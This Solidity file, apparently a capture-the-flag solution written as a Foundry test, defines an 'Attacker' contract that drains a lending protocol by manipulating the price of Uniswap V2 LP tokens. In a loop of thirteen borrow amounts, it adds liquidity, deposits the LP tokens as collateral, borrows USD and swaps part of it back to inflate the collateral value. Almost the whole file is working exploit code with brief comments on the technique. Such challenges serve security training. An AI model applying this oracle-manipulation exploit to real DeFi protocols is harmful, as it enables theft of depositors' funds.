// SPDX-License-Identifier: AGPL-3.0-only
pragma solidity ^0.8.15;

import "forge-std/console.sol";
import {ERC20} from "./ERC20.sol";
import {IUniswapV2Pair} from "./IUniswapV2.sol";
import {LendingProtocol} from "./LendingProtocol.sol";
import "forge-std/Test.sol";

/// @title Attacker
/// @author Christoph Michel <cmichel.io>
contract Attacker is Test {
    IUniswapV2Pair public immutable pair; // token0 <> token1 uniswapv2 pair
    ERC20 public immutable ctf; // token0
    ERC20 public immutable usd; // token1
    LendingProtocol public immutable lending;

    constructor(
        ERC20 _ctf,
        ERC20 _usd,
        IUniswapV2Pair _pair,
        LendingProtocol _lending
    ) {
        ctf = _ctf;
        usd = _usd;
        pair = _pair;
        lending = _lending;
    }

    // @ctf we need to be able to manipulate LP price in USD to borrow more than expected
    // @ctf as the CTF price is constant and is not in the pair, we could swap the borrowed amount of USD
    function attack() external {
        approveAll();
        
        uint256[] memory val = new uint256[](13);
        val[0] = 19999;
        val[1] = 14658;
        val[2] = 7846;
        val[3] = 3691;
        val[4] = 1645;
        val[5] = 716;
        val[6] = 309;
        val[7] = 132;
        val[8] = 57;
        val[9] = 24;
        val[10] = 10;
        val[11] = 5;
        val[12] = 2;
        
        loopHax(val);
    }
    
    function loopHax(uint256[] memory val) public {
        for (uint256 i; i < val.length; i++) {
            emit log_uint(i);

            uint256 curr = val[i];

            addLiquidity(usd.balanceOf(address(this)), ctf.balanceOf(address(this)));
            lending.deposit(address(this), address(pair), pair.balanceOf(address(this)));
            lending.borrow(address(usd), curr * 1e18);

            // logPairPrice("before swap");
            swap(usd, usd.balanceOf(address(this)) / 2);
            // logPairPrice("after swap");
            logRemaining("now");
        }
    }

    function logBal(string memory message) public {
        emit log(message);
        emit log_named_uint("pair", ctf.balanceOf(address(this)));
        emit log_named_uint("ctf", ctf.balanceOf(address(this)));
        emit log_named_uint("usd", usd.balanceOf(address(this)));
    }
    
    function logRemaining(string memory message) public {
        emit log(message);
        emit log_named_uint("remaining", usd.balanceOf(address(lending)) / 1e18);
    }

    function logPairPrice(string memory message) public {
        emit log(message);
        emit log_named_uint("pair price", lending.get());
    }

    function logK(string memory message) public {
        emit log(message);
        (uint256 r0, uint256 r1,) = pair.getReserves();
        uint256 k = r0 * r1;
        emit log_named_uint("k", k);
    }

    function approveAll() public {
        usd.approve(address(lending), type(uint256).max);
        ctf.approve(address(lending), type(uint256).max);
        pair.approve(address(lending), type(uint256).max);
    }

    function addLiquidity(uint256 amt1, uint256 amt2) public {
        usd.transfer(address(pair), amt1);
        ctf.transfer(address(pair), amt2);
        pair.mint(address(this));
        pair.skim(address(this));
    }

    function addAllLiquidity() public {
        addLiquidity(usd.balanceOf(address(this)), ctf.balanceOf(address(this)));
    }

    function removeLiquidity() public {
        pair.transfer(address(pair), pair.balanceOf(address(this)));
        pair.burn(address(this));
    }

    function swap(ERC20 tokIn, uint256 amIn) public {
        (uint256 r0, uint256 r1,) = pair.getReserves();
        tokIn.transfer(address(pair), amIn);
        if (tokIn == ctf) {
            pair.swap(0, getAmountOut(amIn, r0, r1), address(this), "");
        } else {
            pair.swap(getAmountOut(amIn, r1, r0), 0, address(this), "");
        }
        pair.skim(address(this));
    }

    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) internal pure returns (uint amountOut) {
        require(amountIn > 0, 'UniswapV2Library: INSUFFICIENT_INPUT_AMOUNT');
        require(reserveIn > 0 && reserveOut > 0, 'UniswapV2Library: INSUFFICIENT_LIQUIDITY');
        uint amountInWithFee = amountIn * 997;
        uint numerator = amountInWithFee * reserveOut;
        uint denominator = reserveIn * 1000 + amountInWithFee;
        amountOut = numerator / denominator;
    }
}
